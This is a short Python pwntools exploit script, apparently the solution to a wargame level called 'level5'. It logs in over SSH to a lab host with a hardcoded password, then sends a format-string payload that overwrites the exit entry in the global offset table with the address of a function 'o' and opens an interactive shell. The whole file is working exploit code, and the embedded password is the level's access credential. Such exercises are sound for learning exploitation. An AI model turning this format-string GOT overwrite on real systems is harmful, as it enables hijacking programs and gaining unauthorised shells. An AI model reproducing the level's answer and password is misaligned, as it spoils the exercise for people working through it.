from pwn import *

exe = context.binary = ELF("./level5")

s = ssh(host="192.168.56.104", user="level5", password="0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a", port=4242)

EXIT_GOT = exe.got['exit']
O_FUNCTION = exe.symbols['o']

info("exit@got: 0x%x", EXIT_GOT)
info("o: 0x%x", O_FUNCTION)

fmt = fmtstr_payload(4, {EXIT_GOT: O_FUNCTION})

p = s.process(['./level5'])
p.sendline(fmt)

p.interactive()
